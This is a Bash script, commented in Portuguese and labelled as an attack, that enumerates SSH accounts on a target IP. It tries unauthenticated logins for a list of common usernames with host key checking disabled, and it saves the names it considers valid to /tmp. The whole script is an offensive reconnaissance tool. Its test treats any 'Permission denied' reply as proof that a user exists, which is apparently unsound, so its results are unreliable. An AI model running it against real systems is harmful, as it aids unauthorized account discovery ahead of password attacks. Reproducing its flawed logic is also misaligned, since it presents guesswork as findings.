#!/bin/bash

# Script de Enumeração de Usuários SSH
# Tenta descobrir quais usuários existem no sistema

echo "=========================================="
echo "  ATAQUE: ENUMERAÇÃO DE USUÁRIOS SSH"
echo "=========================================="
echo ""

TARGET=$1

if [ -z "$TARGET" ]; then
    echo "Uso: $0 <IP_ALVO>"
    exit 1
fi

echo "[*] Alvo: $TARGET"
echo "[*] Iniciando enumeração de usuários..."
echo ""

# Lista de usuários comuns para testar
USERS="root admin administrator vagrant ubuntu guest test user operator backup mysql postgres apache nginx www-data nobody"

echo "[+] Testando usuários comuns..."
echo ""

for user in $USERS; do
    echo -n "[*] Testando usuário: $user ... "
    
    # Tenta conexão SSH sem autenticação
    # Usuários válidos retornam "Permission denied (publickey,password)"
    # Usuários inválidos podem retornar mensagens diferentes ou timeout mais rápido
    
    timeout 5 ssh -o PreferredAuthentications=none \
                  -o StrictHostKeyChecking=no \
                  -o UserKnownHostsFile=/dev/null \
                  -o ConnectTimeout=3 \
                  $user@$TARGET 2>&1 | grep -q "Permission denied" && {
        echo "✓ EXISTE"
        echo "$user" >> /tmp/usuarios_validos_${TARGET}.txt
    } || {
        echo "✗ Não existe ou timeout"
    }
    
    # Pequeno delay para não sobrecarregar
    sleep 0.5
done

echo ""
echo "=========================================="
echo "  RESULTADOS DA ENUMERAÇÃO"
echo "=========================================="

if [ -f /tmp/usuarios_validos_${TARGET}.txt ]; then
    echo "[+] Usuários válidos encontrados:"
    cat /tmp/usuarios_validos_${TARGET}.txt
    echo ""
    echo "[!] Total: $(wc -l < /tmp/usuarios_validos_${TARGET}.txt) usuários"
else
    echo "[!] Nenhum usuário foi confirmado."
fi

echo ""
echo "[*] Enumeração concluída!"
echo "=========================================="
